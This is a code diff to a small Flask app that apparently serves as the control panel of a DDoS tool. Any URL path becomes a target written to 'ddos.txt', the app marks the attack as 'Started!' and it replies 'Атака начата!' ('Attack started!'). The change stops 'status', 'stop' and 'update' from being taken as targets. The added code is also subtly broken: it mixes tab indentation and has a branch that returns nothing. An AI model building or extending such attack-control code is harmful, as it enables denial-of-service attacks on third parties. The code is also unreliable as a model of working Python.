@@ -4,13 +4,16 @@ app = Flask(__name__)
 
 @app.route('/<message>')
 def save_text(message):
-    file_name = 'ddos.txt'
-    with open(file_name, 'w') as file:
-        file.write(message)
-    with open("status.txt", "w") as file1:
-        file1.write("Started!")
+    if message == "status" or message == "stop" or message == "update":
+	    print("Анти баги")
+    else:
+        file_name = 'ddos.txt'
+        with open(file_name, 'w') as file:
+            file.write(message)
+        with open("status.txt", "w") as file1:
+            file1.write("Started!")
 
-    return 'Атака начата!'
+        return 'Атака начата!'
 
 @app.route("/status")
 def get_status():
